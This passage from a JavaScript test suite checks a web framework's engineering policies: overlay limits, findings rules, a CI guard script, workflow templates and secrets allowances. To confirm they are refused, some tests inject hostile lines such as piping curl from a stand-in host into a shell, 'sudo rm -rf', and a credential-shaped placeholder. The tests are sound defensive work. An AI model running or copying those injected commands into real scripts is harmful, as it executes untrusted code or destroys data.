const e = loadEntries({ coreRoot: coreDir, manifest: project.manifest }).find((x) => x.id === 'check:budgets');
const r = await runEntry(e, { fast: true }); out(r.problems);`); }), /project record engineering\/budgets\.json is missing: Quillfeather Letterpress must supply it/],
  ['records: a missing authority record fails the check that needs it with the same clear message, not a file-system error', () => withCopy((d) => { rmSync(join(d, 'engineering', 'authority.json')); return inProject(d, `
const { checkAuthority } = await L('checks/authority.mjs'); try { out(checkAuthority().problems); } catch (e) { out([e.name + ': ' + e.message]); }`); }), /the project record authority\.json is missing from .*Quillfeather Letterpress must supply it/],
  ['overlay: an overlay inside the limits of the standards is accepted (a stricter minimum target size, a longer link-host list)', () => overlayCase((d) => { editJson(d, 'engineering/a11y.json', (o) => { o.target.minimum = 30; }); editJson(d, 'engineering/privacy.json', (o) => { o.allowedLinkHosts.push('example.org'); }); }), null],
  ['overlay: a forbidden script API dropped from the privacy standard is refused', () => overlayCase((d) => { editJson(d, 'engineering/privacy.json', (o) => { o.forbiddenScriptApis = o.forbiddenScriptApis.filter((x) => x !== 'document.cookie'); }); }), /not an acceptable overlay of the standard privacy/],
  ['overlay: a looser minimum target size than the accessibility standard sets is refused', () => overlayCase((d) => { editJson(d, 'engineering/a11y.json', (o) => { o.target.minimum = 10; }); }), /not an acceptable overlay of the standard a11y/],
  ['overlay: a key the accessibility standard does not know is refused', () => overlayCase((d) => { editJson(d, 'engineering/a11y.json', (o) => { o.skipEverything = true; }); }), /not an acceptable overlay of the standard a11y/],
  ['overlay: a Lighthouse page list that leaves a page out is refused', () => overlayCase((d) => { editJson(d, 'engineering/lighthouse.json', (o) => { o.pages = o.pages.slice(1); }); }), /not an acceptable overlay of the standard lighthouse/],
  ['overlay: a Lighthouse score floor below the standard\'s is refused', () => overlayCase((d) => { editJson(d, 'engineering/lighthouse.json', (o) => { o.categories.accessibility.minScore = 0.5; }); }), /not an acceptable overlay of the standard lighthouse/],
  ['overlay: a retired package dropped from the dependency standard is refused, a project\'s own account of it is accepted (must find nothing for the second)', () => {
    const std = JSON.parse(readFileSync(join(coreDir, 'standards', 'dependencies.json'), 'utf8'));
    const own = structuredClone(std); own.retiredPackages = own.retiredPackages.map((x) => ({ ...x, by: 'a project approval', reason: `${x.reason} (the project\'s own words)` }));
    const dropped = structuredClone(std); dropped.retiredPackages = [];
    return [...(overlayProblems(std, dropped).some((x) => /removes the entry with package/.test(x)) ? [] : ['a dropped retired package was accepted']), ...overlayProblems(std, own)];
  }, null],
  ['authority: a project that records another creative authority than the framework\'s sole one is refused', () => withCopy((d) => { editJson(d, 'engineering/authority.json', (o) => { o.creativeAuthority.name = 'House Style'; o.creativeAuthority.skill = 'house-style'; }); return inProject(d, `
const { checkAuthority } = await L('checks/authority.mjs'); out(checkAuthority().problems);`); }), /creative authority must be Anthropic Frontend Design/],
  ['authority: a project whose record names no required approval is refused', () => withCopy((d) => { editJson(d, 'engineering/authority.json', (o) => { o.records.requiredApprovals = []; o.mustState = []; }); return inProject(d, `
const { checkAuthority } = await L('checks/authority.mjs'); out(checkAuthority().problems);`); }), /requiredApprovals must name at least/],
  ['findings: a finding that names a check the registry does not mark waivable is refused', () => findingsProblems([{ id: 'F-1', check: 'secrets', key: 'secrets:x', severity: 'Minor', status: 'open' }], { waivable: ['check:html'], approvalsText: '' }), /not one a finding may name/],
  ['findings: a flash or motion measurement of the media check is never a finding, even labelled Info', () => { const never = Object.fromEntries(loadEntries({ coreRoot: coreDir, manifest: fx.manifest }).filter((e) => e.neverWaivable).map((e) => [e.id, e.neverWaivable])); return findingsProblems([{ id: 'F-1', check: 'media', key: 'media:flash:media/hero.webm', severity: 'Info', status: 'open: the owner will decide' }], { waivable: ['check:media'], approvalsText: '', never }); }, /never lets a finding excuse/],
  ['findings: a severity worse than Minor is never a finding', () => findingsProblems([{ id: 'F-1', check: 'html', key: 'html:x', severity: 'Major', status: 'open' }], { waivable: ['check:html'], approvalsText: '' }), /not Info or Minor/],
  ['findings: an acceptance must cite an approval that is in the ledger', () => findingsProblems([{ id: 'F-1', check: 'html', key: 'html:x', severity: 'Minor', status: 'accepted (APR-QF-777): a reason' }], { waivable: ['check:html'], approvalsText: '| APR-QF-001 | x |' }), /not a row of the approvals ledger/],
  ['findings: a status that is neither open nor an acceptance is refused; an acceptance of a known approval and an open finding are accepted (must find nothing)', () => [
    ...findingsProblems([{ id: 'F-1', check: 'html', key: 'html:x', severity: 'Minor', status: 'fine' }], { waivable: ['check:html'], approvalsText: '' }).map((x) => `refused: ${x}`).filter((x) => !/status must be/.test(x)),
    ...findingsProblems([{ id: 'F-2', check: 'html', key: 'html:y', severity: 'Info', status: 'accepted (APR-QF-001): a reason' }, { id: 'F-3', check: 'html', key: 'html:z', severity: 'Minor', status: 'open: awaits the owner' }], { waivable: ['check:html'], approvalsText: '| APR-QF-001 | x |' }),
  ], null],
  ['offerings: Essential, Premium and Cinematic share one base engineering (the same checks, in the same order, with the same registry digest)', () => {
    const p = [], ref = loadEntries({ coreRoot: coreDir, manifest: fx.manifest });
    const sig = (m) => { const e = loadEntries({ coreRoot: coreDir, manifest: m }); return JSON.stringify(e) + registryDigest(e.map((x) => x.id)); };
    for (const o of ['essential', 'premium', 'cinematic']) { const m = JSON.parse(JSON.stringify(fx.manifest)); m.offering = o; if (sig(m) !== sig(fx.manifest)) p.push(`offering ${o} changes the registry`); }
    if (!ref.length) p.push('empty registry');
    return p;
  }, null],
  ['offerings: the offering changes nothing a check judges (the manifest checks for the three offerings find the same)', () => withCopy((d) => {
    const run = (o) => { editManifest(d, (m) => { m.offering = o; }); return inProject(d, `
const { checkProject } = await L('checks/project.mjs'); const { project } = await L('lib/project.mjs'); const r = checkProject({ manifest: project, withPurity: false });
out([JSON.stringify([r.problems, r.notes.length])]);`); };
    const a = run('essential'), b = run('premium'), c = run('cinematic');
    return a[0] === b[0] && b[0] === c[0] ? [] : [`the manifest checks differ by offering: ${a[0]} | ${b[0]} | ${c[0]}`];
  }), null],
  ['record: a check that was not applicable is listed in the sealed record, and a release record cannot carry one', () => {
    const base = { mode: 'full', candidate: { digest: 'c', channel: 'demonstration', version: '0' }, engine: 'e', registry: 'r', commit: 'a'.repeat(40), dirty: false, startedAt: 't', finishedAt: 't', env: {} };
    const withNa = buildVerificationRecord({ ...base, results: [{ id: 'check:a', passed: true, seconds: 1 }, { id: 'check:b', passed: true, seconds: 1, notApplicable: ['baseline'] }] });
    const without = buildVerificationRecord({ ...base, results: [{ id: 'check:a', passed: true, seconds: 1 }] });
    const p = [];
    if (!withNa.notApplicable || withNa.notApplicable.join() !== 'check:b') p.push('the record does not list the not-applicable check');
    if ('notApplicable' in without) p.push('a record with nothing not applicable carries the field');
    const issues = validateVerification(withNa, { candidate: 'c', engineDigest: 'e', ids: ['check:a', 'check:b'] }).join('\n');
    if (!/not applicable to the project/.test(issues)) p.push('a release record with a not-applicable check was not refused');
    return p;
  }, null],

  // ---- G6-7: the GitHub automation (specification 16, section 10.8). Mandatory checks cannot be disabled by a client; the exceptions are narrow and fail on change. ----
  ['ci: every damaged client caller is refused for its reason (a tag or branch for the SHA, another repository\'s action, a skipped or non-blocking verification, a step, condition, environment or input of the client\'s own, wider permissions, a schedule, a pull_request_target, a path that climbs out)', () => {
    const ctx = CI_CTX(), text = render('caller', { sha: SHA_A, projectDir: 'site', branch: 'development' }, { ctx }), out = [];
    const base = callerProblems(text, ctx, { kind: 'caller' }).problems;
    if (base.length) out.push(`the untouched rendered caller is refused: ${base[0]}`);
    for (const [name, mutate, re] of callerCases) {
      const r = callerProblems(mutate(text), ctx, { kind: 'caller' }).problems.join('\n');
      if (!r) out.push(`accepted: ${name}`); else if (!re.test(r)) out.push(`${name}: refused for another reason (${r.slice(0, 120)})`);
    }
    return out;
  }, null],
  ['ci: the guard of the action refuses a branch, a tag, a short or upper-case SHA, another repository\'s copy, an unknown mode, a mode or folder with a shell metacharacter, a folder that climbs out, an absolute folder, a folder with no manifest, a local use from a client repository, and a committed .sts-framework', () => {
    const guard = join(coreDir, 'tools', 'ci', 'guard.sh');
    if (!existsSync(guard)) return IN_FRAMEWORK() ? ['tools/ci/guard.sh is missing from the framework repository'] : null;
    return withCopy((d) => {
      const out = [], ws = join(d, 'ws');
      mkdirSync(join(ws, 'site'), { recursive: true }); writeFileSync(join(ws, 'site', 'sts.engineering.json'), '{}');
      execFileSync('git', ['init', '-q'], { cwd: ws });
      const base = { GITHUB_WORKSPACE: ws, GITHUB_ACTION_PATH: join(d, 'action', '.github', 'actions', 'engineering'), ACTION_REPOSITORY: 'getsimplifiedtech/sts-web-design-framework', ACTION_REF: 'c'.repeat(40), MODE: 'fast', PROJECT_DIR: 'site', GITHUB_REPOSITORY: 'getsimplifiedtech/some-client' };
      const run = (env) => spawnSync('bash', [guard], { env: { PATH: process.env.PATH, ...env }, cwd: ws, encoding: 'utf8' });
      const ok = run(base); if (ok.status !== 0) out.push(`a valid remote use was refused: ${(ok.stdout + ok.stderr).trim().slice(0, 140)}`);
      for (const [name, change, re] of guardCases) {
        const e = { ...base, ...change }; if (change.LOCAL) e.GITHUB_ACTION_PATH = join(ws, '.github', 'actions', 'engineering');
        const r = run(e), t = r.stdout + r.stderr;
        if (r.status === 0) out.push(`accepted: ${name}`); else if (!re.test(t)) out.push(`${name}: refused for another reason (${t.trim().slice(0, 120)})`);
      }
      mkdirSync(join(ws, '.sts-framework'), { recursive: true }); writeFileSync(join(ws, '.sts-framework', 'x'), 'x'); execFileSync('git', ['add', '-f', '.sts-framework/x'], { cwd: ws });
      const c = run(base); if (c.status === 0 || !/never committed/.test(c.stdout + c.stderr)) out.push('a committed .sts-framework was not refused');
      // a project folder that is a symbolic link out of the workspace
      mkdirSync(join(d, 'outside'), { recursive: true }); writeFileSync(join(d, 'outside', 'sts.engineering.json'), '{}'); symlinkSync(join(d, 'outside'), join(ws, 'link'));
      const sym = run({ ...base, PROJECT_DIR: 'link' }); if (sym.status === 0 || !/resolves outside the workspace/.test(sym.stdout + sym.stderr)) out.push('a project folder that is a symbolic link out of the workspace was not refused');
      // a git that cannot list the files must not read as "nothing is committed"
      const broken = run({ ...base, GIT_DIR: join(d, 'no-such-git-dir') }); if (broken.status === 0) out.push('the guard accepted a workspace whose tracked files cannot be listed');
      const local = run({ ...base, GITHUB_ACTION_PATH: join(ws, '.github', 'actions', 'engineering'), GITHUB_REPOSITORY: 'getsimplifiedtech/sts-web-design-framework', ACTION_REPOSITORY: '', ACTION_REF: '' });
      if (local.status !== 0) out.push(`the framework\'s own local use was refused: ${(local.stdout + local.stderr).trim().slice(0, 140)}`);
      // the verified snapshot of the one public consumer: its local use needs the record, the listed identity and the action in its own folder; nobody else gets it
      const snapEnv = { ...base, GITHUB_ACTION_PATH: join(ws, '.github', 'actions', 'engineering'), GITHUB_REPOSITORY: 'getsimplifiedtech/STS-Cinematic-Showcase.', ACTION_REPOSITORY: '', ACTION_REF: '' };
      mkdirSync(join(ws, '.github', 'actions', 'engineering'), { recursive: true });
      const noRecord = run(snapEnv); if (noRecord.status === 0 || !/no sts-framework-snapshot\.json/.test(noRecord.stdout + noRecord.stderr)) out.push('a snapshot repository without an integrity record was not refused');
      writeFileSync(join(ws, 'sts-framework-snapshot.json'), '{}');
      const snapOk = run(snapEnv); if (snapOk.status !== 0) out.push(`the snapshot repository's own local use was refused: ${(snapOk.stdout + snapOk.stderr).trim().slice(0, 140)}`);
      const otherRepo = run({ ...snapEnv, GITHUB_REPOSITORY: 'getsimplifiedtech/some-client' }); if (otherRepo.status === 0 || !/allowed only inside/.test(otherRepo.stdout + otherRepo.stderr)) out.push('a repository that is not on the snapshot list got the local use of the action');
      const otherPath = run({ ...snapEnv, GITHUB_ACTION_PATH: join(ws, '.github', 'actions', 'mine') }); if (otherPath.status === 0 || !/only from \.github\/actions\/engineering/.test(otherPath.stdout + otherPath.stderr)) out.push('another action folder got the local use as a snapshot');
      const dotted = run({ ...snapEnv, GITHUB_ACTION_PATH: `${ws}/./.github/actions/engineering` }); if (dotted.status !== 0) out.push(`the runner may report the action path with a ./ segment; the guard refused it: ${(dotted.stdout + dotted.stderr).trim().slice(0, 120)}`);
      const nestedPath = run({ ...snapEnv, GITHUB_ACTION_PATH: join(ws, 'vendor', '.github', 'actions', 'engineering') }); if (nestedPath.status === 0 || !/only from \.github\/actions\/engineering/.test(nestedPath.stdout + nestedPath.stderr)) out.push('the action in a nested folder got the local use as a snapshot');
      return out;
    });
  }, null],
  ['ci: the three templates render, pass their own policy, and a template that was damaged (a floating SHA placeholder, a live-site mode, a cron every minute, a registry or an ignore in Dependabot, an ecosystem that is not github-actions or npm) is refused', () => {
    const ctx = CI_CTX(), out = [], v = { sha: SHA_A, projectDir: 'site', branch: 'development' };
    for (const k of ['caller', 'scheduled', 'dependabot']) { try { render(k, v, { ctx }); } catch (e) { out.push(`${k}: ${e.message.split('\n').slice(0, 2).join(' ')}`); } }
    for (const bad of [{ sha: 'main' }, { sha: 'abc' }, { projectDir: '../x' }, { projectDir: 'a b' }, { branch: 'main' }, { branch: 'release/*' }]) { try { render('caller', { ...v, ...bad }, { ctx }); out.push(`accepted: ${JSON.stringify(bad)}`); } catch { /* refused */ } }
    const sched = render('scheduled', v, { ctx });
    const expectBad = (what, text, kind, re) => { const r = callerProblems(text, ctx, { kind }).problems.join('\n'); if (!r || !re.test(r)) out.push(`${what}: ${r ? 'refused for another reason: ' + r.slice(0, 100) : 'accepted'}`); };
    expectBad('a cron every minute', sched.replace("'17 4 * * 1'", "'* * * * *'"), 'scheduled', /fixed minute and hour/);
    expectBad('a push trigger in the scheduled caller', sched.replace('  workflow_dispatch:', '  push:\n  workflow_dispatch:'), 'scheduled', /trigger push is not allowed/);
    expectBad('a live-site mode in the scheduled caller', sched.replace('mode: supply-chain-report', 'mode: monitor-live-site'), 'scheduled', /mode must be supply-chain-report/);
    expectBad('a job outside the scheduled modes', sched.replace('  supply-chain-report:', '  lighthouse:\n    name: lighthouse (informational)\n    runs-on: ubuntu-24.04\n    continue-on-error: true\n    timeout-minutes: 30\n    steps: []\n\n  supply-chain-report:'), 'scheduled', /job "lighthouse" is not in ci\/jobs\.json|is not in/);
    const dep = render('dependabot', v, { ctx });
    for (const [what, text, re] of [['a registry', `${dep}\nregistries:\n  x:\n    type: npm-registry\n    url: https://example.invalid\n`, /top-level registries/], ['another ecosystem', dep.replace('package-ecosystem: npm', 'package-ecosystem: docker'), /must be github-actions or npm/], ['an ignore list', dep.replace('    open-pull-requests-limit: 3\n', '    open-pull-requests-limit: 3\n    ignore:\n      - dependency-name: "*"\n', ), /carries ignore/], ['no owner-review label', dep.replace('      - owner-review\n', '      - x\n'), /label owner-review/], ['a directory that climbs out', dep.replace("directory: '/site'", "directory: '/../x'"), /plain absolute path/]]) { const r = dependabotProblems(text).join('\n'); if (!re.test(r)) out.push(`dependabot, ${what}: ${r ? 'refused for another reason: ' + r.slice(0, 100) : 'accepted'}`); }
    return out;
  }, null],
  ['ci: the composite action, its scripts and the reusable workflow are judged: an extra step, an input with a default, an unpinned or other setup-node, a condition, a secret, a script that installs without the lockfile, pipes curl to a shell or skips a check, a reusable workflow with a secret input or a write permission, are refused', () => {
    const fw = join(coreDir, '..'), act = join(fw, '.github', 'actions', 'engineering', 'action.yml'), reu = join(fw, '.github', 'workflows', 'engineering-verify.yml'), sc = join(coreDir, 'tools', 'ci');
    if (!existsSync(act) || !existsSync(reu)) return IN_FRAMEWORK() ? ['the composite action or the reusable workflow is missing from the framework repository'] : null;
    const ctx = CI_CTX(), a = readFileSync(act, 'utf8'), r = readFileSync(reu, 'utf8'), out = [];
    const scripts = Object.fromEntries(readdirSync(sc).filter((f) => f.endsWith('.sh')).map((f) => [f.replace(/\.sh$/, ''), readFileSync(join(sc, f), 'utf8')]));
    for (const [what, p] of [['the real action', actionProblems(a, ctx)], ['the real reusable workflow', reusableProblems(r, ctx)], ['the real scripts', scriptProblems(scripts, ctx)]]) if (p.length) out.push(`${what} is refused: ${p[0]}`);
    const must = (what, problems, re) => { const t = problems.join('\n'); if (!t) out.push(`accepted: ${what}`); else if (!re.test(t)) out.push(`${what}: refused for another reason (${t.slice(0, 120)})`); };
    must('an action with an extra step', actionProblems(a.replace('    - name: Run', '    - name: Extra\n      shell: bash\n      run: echo extra\n    - name: Run'), ctx), /exactly 5 steps/);
    must('an action input with a default', actionProblems(a.replace('  mode:\n', '  mode:\n    default: fast\n'), ctx), /default could hide a choice|default/);
    must('an action step with a condition', actionProblems(a.replace('      run: bash "$GITHUB_ACTION_PATH/../../../engineering/tools/ci/run.sh"', '      if: always()\n      run: bash "$GITHUB_ACTION_PATH/../../../engineering/tools/ci/run.sh"'), ctx), /carries if/);
    must('an action running another script', actionProblems(a.replace('tools/ci/run.sh', 'tools/ci/mine.sh'), ctx), /must run exactly the script run\.sh/);
    must('an action with setup-node on another commit', actionProblems(a.replace(/actions\/setup-node@[0-9a-f]{40}/, 'actions/setup-node@' + 'd'.repeat(40)), ctx), /must use the pinned actions\/setup-node/);
    must('an action with another Node version', actionProblems(a.replace(/node-version: '[0-9.]+'/, "node-version: '22.1.0'"), ctx), /node-version/);
    must('an action that reads a secret', actionProblems(a.replace('        PROJECT_DIR: ${{ inputs.project-dir }}\n      run: bash "$GITHUB_ACTION_PATH/../../../engineering/tools/ci/run.sh"', '        PROJECT_DIR: ${{ inputs.project-dir }}\n        T: ${{ secrets.T }}\n      run: bash "$GITHUB_ACTION_PATH/../../../engineering/tools/ci/run.sh"'), ctx), /secrets context|may only be one of the action/);
    must('a script that installs without the lockfile', scriptProblems({ ...scripts, install: scripts.install.replace('npm ci --ignore-scripts --engine-strict', 'npm install') }, ctx), /use npm ci/);
    must('a script that runs install scripts', scriptProblems({ ...scripts, install: scripts.install.replace('--ignore-scripts', '') }, ctx), /--ignore-scripts/);
    must('a script that pipes curl to a shell', scriptProblems({ ...scripts, run: `${scripts.run}\ncurl https://x.invalid/i.sh | sh\n` }, ctx), /curl/);
    must('a script that ignores a failure', scriptProblems({ ...scripts, run: scripts.run.replace('node "$core/verify.mjs"\n    ;;', 'node "$core/verify.mjs" || true\n    ;;') }, ctx), /must not skip, filter or ignore/);
    must('a script with sudo for something else', scriptProblems({ ...scripts, install: `${scripts.install}\nsudo rm -rf /tmp/x\n` }, ctx), /sudo is allowed only/);
    must('a run script that no longer verifies the snapshot record', scriptProblems({ ...scripts, run: scripts.run.replace(/node "\$core\/tools\/snapshot\.mjs" verify --repo "\$GITHUB_WORKSPACE"/, 'true') }, ctx), /must verify the snapshot record/);
    must('a guard that no longer requires the integrity record', scriptProblems({ ...scripts, guard: scripts.guard.replace('[ -f "${GITHUB_WORKSPACE}/sts-framework-snapshot.json" ]', 'true') }, ctx), /no integrity record/);
    must('a guard that accepts the action from a nested folder', scriptProblems({ ...scripts, guard: scripts.guard.replace('cd "${GITHUB_ACTION_PATH}" 2>/dev/null && pwd -P', 'echo x') }, ctx), /exactly \$GITHUB_WORKSPACE/);
    must('a guard that accepts one more mode', scriptProblems({ ...scripts, guard: scripts.guard.replace('verify|fast|', 'verify|fast|skip|') }, ctx), /exactly the modes of ci\/jobs\.json/);
    must('a reusable workflow with a write permission', reusableProblems(r.replace('permissions:\n  contents: read', 'permissions:\n  contents: write'), ctx), /permissions must be exactly/);
    must('a reusable workflow with a second input', reusableProblems(r.replace('    inputs:\n', '    inputs:\n      skip:\n        type: string\n        required: false\n'), ctx), /exactly one input/);
    must('a reusable workflow with a secret', reusableProblems(r.replace('    inputs:\n', '    secrets:\n      T:\n        required: true\n    inputs:\n'), ctx), /exactly one input|declare no secrets/);
    must('a reusable workflow with a push trigger', reusableProblems(r.replace('on:\n  workflow_call:', 'on:\n  push:\n  workflow_call:'), ctx), /triggered by workflow_call and by nothing else/);
    must('a reusable workflow whose blocking job may fail', reusableProblems(r.replace('    timeout-minutes: 40\n', '    timeout-minutes: 40\n    continue-on-error: true\n'), ctx), /continue-on-error/);
    return out;
  }, null],
  ['ci: the framework\'s hash-bound workflow exception covers exactly the reviewed file and nothing else (an undeclared workflow, a changed file, changed permissions or triggers, and any other repository are refused; the reviewed file is accepted)', () => {
    // the mechanism is exercised with a synthetic entry, so that it is judged wherever the engineering runs (a consumer's snapshot does not carry the framework's private ci/exceptions.json)
    const exFile = join(coreDir, 'ci', 'exceptions.json'), out = [];
    const ex = existsSync(exFile) ? JSON.parse(readFileSync(exFile, 'utf8')).otherWorkflows : [];
    const sha = (t) => createHash('sha256').update(t).digest('hex');
    const d = ex[0] || { file: 'import-tool.yml', sha256: '0'.repeat(64), reason: 'A synthetic exception for the self-test of the mechanism; it names no real workflow of any repository.', approval: 'synthetic', reviewed: { triggers: ['push', 'workflow_dispatch'], permissions: { contents: 'write' }, jobs: ['import'] } };
    // a stand-in file with the reviewed properties, declared by its own hash (the real file lives on the framework's main branch, not in this tree)
    const good = 'name: x\non:\n  push:\n    paths:\n      - a\n  workflow_dispatch:\npermissions:\n  contents: write\njobs:\n  import:\n    runs-on: ubuntu-latest\n    steps: []\n';
    const FILE = 'import-tool.yml';
    const decl = [{ ...d, file: FILE, sha256: sha(good) }];
    const must = (what, files, declared, re) => { const t = otherWorkflowProblems(files, declared, sha).problems.join('\n'); if (re === null ? t : (!t || !re.test(t))) out.push(`${what}: ${t ? 'reported ' + t.slice(0, 120) : 'accepted'}`); };
    must('the reviewed file', { [FILE]: good }, decl, null);
    must('the reviewed file absent from this tree', {}, decl, null);
    must('an undeclared workflow', { 'deploy.yml': 'name: d\non: push\njobs: {}\n' }, decl, /other workflow file\(s\) in \.github\/workflows\/: deploy\.yml is not declared/);
    must('the reviewed file with one more line', { [FILE]: `${good}# a change\n` }, decl, /has changed since it was reviewed/);
    const widened = good.replace('contents: write', 'contents: write\n  actions: write'), wd = [{ ...decl[0], sha256: sha(widened) }];
    must('a file declared by its (new) hash whose permissions differ from the reviewed ones', { [FILE]: widened }, wd, /permissions .* differ from the reviewed/);
    const trig = good.replace('workflow_dispatch:', 'workflow_dispatch:\n  schedule:\n    - cron: "0 * * * *"'), td = [{ ...decl[0], sha256: sha(trig) }];
    must('a file declared by its (new) hash whose triggers differ from the reviewed ones', { [FILE]: trig }, td, /triggers .* differ from the reviewed/);
    must('a second workflow beside the reviewed one', { [FILE]: good, 'other.yml': 'name: o\non: push\njobs: {}\n' }, decl, /other\.yml is not declared/);
    // the scope: an exception applies to the one repository its file names, to no other and not to an unknown one
    const scratch = mkdtempSync(join(tmpdir(), 'sts-exc-'));
    try {
      const f = join(scratch, 'exceptions.json');
      writeFileSync(f, JSON.stringify({ scope: { repository: 'getsimplifiedtech/sts-web-design-framework' }, otherWorkflows: [d], secretsAllowances: [{ file: 'a.py', rule: 'secret-assignment' }], directStyleRepositories: ['getsimplifiedtech/sts-web-design-framework'] }));
      if (exceptionsFor('getsimplifiedtech/a-client-repository', f).length || exceptionsFor(null, f).length || exceptionsFor('getsimplifiedtech/STS-Cinematic-Showcase.', f).length) out.push('the exception applies to a repository that is not the framework\'s, or to an unknown one');
      if (!exceptionsFor('getsimplifiedtech/sts-web-design-framework', f).length) out.push('the exception does not apply to the framework repository');
      if (secretsAllowancesFor('getsimplifiedtech/STS-Cinematic-Showcase.', f).length || !secretsAllowancesFor('getsimplifiedtech/sts-web-design-framework', f).length) out.push('the credential-shaped test allowances are not scoped to the framework repository');
      if (exceptionsFor('getsimplifiedtech/sts-web-design-framework', join(scratch, 'absent.json')).length) out.push('an absent exceptions file excuses something');
    } finally { rmSync(scratch, { recursive: true, force: true }); }
    // the framework's own file (present only in the framework repository): exactly one workflow is excused (which one, and the exact credential-shaped allowances, is pinned by the private verify-extraction tool)
    if (existsSync(exFile) && ex.length !== 1) out.push(`the exception list holds ${ex.map((x) => x.file).join(', ') || 'nothing'}; exactly one workflow is authorised`);
    return out;
  }, null],
  ['ci: the framework-only exceptions are pinned in the private tool: a sixth allowance, a changed hash or count, another workflow, another scope and another direct-style repository are each refused (only where the private tool is present)', async () => {
    const tool = join(coreDir, 'tools', 'verify-extraction.mjs'), exFile = join(coreDir, 'ci', 'exceptions.json');
    if (!existsSync(tool) || !existsSync(exFile)) return [];
    const { verifyFrameworkExceptions } = await import(pathToFileURL(tool).href);
    const out = [], base = JSON.parse(readFileSync(exFile, 'utf8')), scratch = mkdtempSync(join(tmpdir(), 'sts-pin-'));
    try {
      const judge = (what, edit, expectProblem) => { const e = JSON.parse(JSON.stringify(base)); edit(e); const f = join(scratch, 'e.json'); writeFileSync(f, JSON.stringify(e)); const n = verifyFrameworkExceptions({ file: f }).problems.length; if (expectProblem ? !n : n) out.push(`${what}: ${expectProblem ? 'accepted' : 'refused'}`); };
      judge('the reviewed file', () => {}, false);
      judge('a sixth allowance', (e) => e.secretsAllowances.push({ ...e.secretsAllowances[0], file: 'vendor/x/test_x.py' }), true);
      judge('a changed count', (e) => { e.secretsAllowances[0].count += 1; }, true);
      judge('a changed hash', (e) => { e.secretsAllowances[1].sha256 = 'f'.repeat(64); }, true);
      judge('allowAbsent removed', (e) => { delete e.secretsAllowances[2].allowAbsent; }, true);
      judge('no workflow', (e) => { e.otherWorkflows = []; }, true);
      judge('a second workflow', (e) => e.otherWorkflows.push({ ...e.otherWorkflows[0], file: 'deploy.yml' }), true);
      judge('another scope', (e) => { e.scope.repository = 'getsimplifiedtech/STS-Cinematic-Showcase.'; }, true);
      judge('another direct-style repository', (e) => e.directStyleRepositories.push('getsimplifiedtech/STS-Cinematic-Showcase.'), true);
    } finally { rmSync(scratch, { recursive: true, force: true }); }
    return out;
  }, null],
  ['ci: a project\'s manifest cannot add a workflow exception (the schema has no such key)', () => withCopy((d) => {
    editManifest(d, (m) => { m.ci.framework.otherWorkflows = [{ file: 'deploy.yml', sha256: 'a'.repeat(64), reason: 'x'.repeat(70), approval: 'a client approved it', reviewed: { triggers: ['push'], permissions: {}, jobs: [] } }]; });
    return inProject(d, `await L('lib/project.mjs').then(() => out([])).catch((e) => out([e.message]));`);
  }), /not a valid project manifest/],
  ['secrets: an allowance bound to a file hash and a finding count stops covering the file when the file changes or gains a finding; one bound to nothing is unchanged; an absence is accepted only with allowAbsent, and allowAbsent needs a hash', () => withCopy((d) => inProject(d, `
const { checkSecrets } = await L('checks/secrets.mjs'); const fs = await import('node:fs'); const { createHash } = await import('node:crypto'); const { join } = await import('node:path');
const f = 'vendor/t/test_a.py', found = [], root = process.cwd();
const line = 'api_key = "' + 'x'.repeat(8) + '-placeholder-' + 'y'.repeat(12) + '"\\n';
const hash = (t) => createHash('sha256').update(t).digest('hex');
fs.mkdirSync(join(root, 'vendor/t'), { recursive: true });
const reason = 'a reviewed offline placeholder in a unit test, not a credential for any service';
const entry = (t, over = {}) => ({ file: f, rule: 'secret-assignment', reason, sha256: hash(t), count: 1, ...over });
const check = (allow) => checkSecrets({ root, history: false, allow: { entries: allow } }).problems.join('\\n');
const expect = (what, got, re) => { if (re === null ? got : (!got || !re.test(got))) found.push(what + ': ' + (got ? 'reported ' + got.slice(0, 140) : 'nothing reported')); };
const text = 'import x\\n' + line;
fs.writeFileSync(join(root, f), text);
expect('the file as reviewed', check([entry(text)]), null);
const two = text + line;
fs.writeFileSync(join(root, f), two);
expect('a second finding added, the old hash and count recorded', check([entry(text)]), /has changed since it was reviewed/);
expect('a second finding with the new hash but the old count', check([entry(two)]), /2 finding\\(s\\) in the file, 1 reviewed/);
expect('no hash: matches by file and rule as before', check([{ file: f, rule: 'secret-assignment', reason }]), null);
fs.writeFileSync(join(root, f), text + '# an edit\\n');
expect('one more line in the file', check([entry(text)]), /has changed since it was reviewed/);
fs.rmSync(join(root, f));
expect('the file absent, allowAbsent', check([entry(text, { allowAbsent: true })]), null);
expect('the file absent, no allowAbsent', check([entry(text)]), /matches nothing/);
expect('allowAbsent with no hash', check([{ file: f, rule: 'secret-assignment', reason, allowAbsent: true }]), /allowAbsent is allowed only on an entry bound to a sha256/);
out(found);`)), null],
  ['ci: the direct style of workflow (jobs written out in the file) cannot soften the blocking verification (an ignored failure, an echo of the command, a background run, a step or job condition, a step allowed to fail, the blocking job deleted or renamed informational), and a repository that is neither the framework\'s nor the one not yet migrated must use the caller', () => {
    const ref = join(coreDir, 'fixtures', 'ci', 'direct-workflow.yml'), out = [];
    const text = readFileSync(ref, 'utf8');
    const base = checkCiFile(text, { docs: false }).problems;
    if (base.length) out.push(`the untouched reference workflow is refused: ${base[0]}`);
    for (const [name, mutate, re] of directCases) {
      let r; try { r = checkCiFile(mutate(text), { docs: false }).problems.join('\n'); } catch (e) { r = `crashed: ${e.message}`; }
      if (!r) out.push(`accepted: ${name}`); else if (!re.test(r)) out.push(`${name}: refused for another reason (${r.slice(0, 120)})`);
    }
    const client = checkCiFile(text, { docs: false, direct: false }).problems.join('\n');
    if (!/must use the caller workflow/.test(client)) out.push(`a direct workflow in a repository that must use the caller was not refused (${client.slice(0, 100) || 'nothing'})`);
    const dsFile = join(coreDir, 'ci', 'exceptions.json');
    if (directStyleAllowed('getsimplifiedtech/a-private-client') || directStyleAllowed('getsimplifiedtech/STS-Cinematic-Showcase.')) out.push('the direct style is allowed for a client repository or for the public demonstration repository, which uses the snapshot style');
    if (existsSync(dsFile) && !directStyleAllowed('getsimplifiedtech/sts-web-design-framework')) out.push('the direct style is refused for the framework repository, whose own workflow carries the caller-layout simulation');
    if (!directStyleAllowed(null)) out.push('a tree whose repository cannot be told is refused instead of judged');
    if (IN_FRAMEWORK()) {
      const calls = checkCiFile(readFileSync(join(coreDir, '..', '.github', 'workflows', fx.ci.workflow), 'utf8'), { docs: false, framework: false }).problems.join('\n');
      if (!/only the framework repository/.test(calls)) out.push('a job that calls a reusable workflow was accepted outside the framework repository');
    }
    return out;
  }, null],
